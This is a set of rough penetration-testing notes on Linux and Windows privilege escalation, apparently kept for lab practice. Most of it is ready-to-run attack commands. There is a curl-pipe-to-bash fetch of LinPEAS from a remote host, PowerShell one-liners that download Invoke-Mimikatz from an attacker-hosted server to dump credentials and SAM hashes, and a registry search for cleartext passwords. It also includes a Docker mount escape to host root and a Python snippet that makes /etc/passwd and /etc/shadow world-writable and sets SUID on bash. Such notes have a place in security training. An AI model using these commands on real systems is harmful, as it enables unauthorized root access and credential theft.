---
description: Rough notes on privilege escalation
---

# Privilege Escalation

### Privilege Escalation - Linux

* If LinPEAS doesn't return anything useful then it is possible you already have the information needed to privilege escalate. Try default passwords, [priv esc with fail2ban](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/), and other common tricks.
* [Docker Privesc](http://revshells.com)
* Don't forget to check for any Kernel exploits.&#x20;
  * `uname -a`
* For privilege escalation with fail2ban, use a netcat shell or modify the permissions of `/etc/shadow`
  * [Amazing Guide on Privilege Escalation with Fail2ban](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)
* If there are no writable directories then just pipe LinPEAS (or other tool of choice) directly into bash:
  * `curl 10.10.10.1:8080/linpeas.sh | bash`
  * Run the following command to identify possible priivlege escalation efforts:
    * `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
  * If you've identified a CronJob that may be exploitable then it may be worth plugging it into [CronGuru](https://crontab.guru/#\*/3\_\*\_\*\_\*\_\*).
  * If spawning a shell, check all files for MySQL credentials. It is likely you will be able to privilege escalate once located.
    * To login, ensure you have a stable shell and type `mysql -u root -p`
  * If you are a member of the 'Docker' group then there are multiple opportunities for privilege escalation.  Below is a list of a few examples:
    1. `docker images`
    2. `docker run -v /:/mnt --rm -it [IMAGE] chroot /mnt sh`
  * If breaking out of a restricted shell, ensure you check the local bin and then GTFOBins for any easy breakouts.
    *   Sometimes you will have to export your path after breaking out of a restricted shell. Use the following command to correct your path:

        ```
        export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

        ```

### Privilege Escalation - Windows

* PowerShell Empire has some great PS1 scripts readily available such as `Invoke-Watson` and `Invoke-MS16032` as examples. Their `Mimikatz.ps1` is also great. These can be accessed at `/usr/share/powershell-empire/empire/server/data/module_source/`
* Use the following command to search for cleartext passwords in registry:
  * `reg query HKCU /f password /t REG_SZ /s`
  * In some cases this may be modified to `reg query HKCU /f pass /t REG_SZ /s`
* Lots of people seem to forget that Windows binaries are readily available on Kali.&#x20;
  * `/usr/share/windows-binaries`
* Fix your Windows path with the following command: `set PATH=%SystemRoot%\system32;%SystemRoot%;`
* Unable to get Mimikatz onto a machine? Simply host a http server and execute the following:
  * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
  * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
* Check out `C:\Program Files (x86)` for any outdated and vulnerable installations.
* Mimikatz errors? Need to downgrade your version? Use the version availabke at [this link](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/).
* Here are some good resources for Windows Privilege Escalation
  * [0x1 Gitlab](https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges)
  * [Juicy Potato Walkthrough](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505)
  * [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)&#x20;

### Python Priv Esc

We can privesc in multiple ways from running this script. For example, we can add a root user to the /etc/passwd file or we can run `/bin/bash -p` to obtain a shell with root privileges. .&#x20;

```python
import os

def stop(text,value):
        os.system("chmod 777 /etc/passwd");

def reset(text,value):
        os.system("chmod +s /bin/bash");

def start(text,value):
        os.system("chmod 777 /etc/shadow");
```
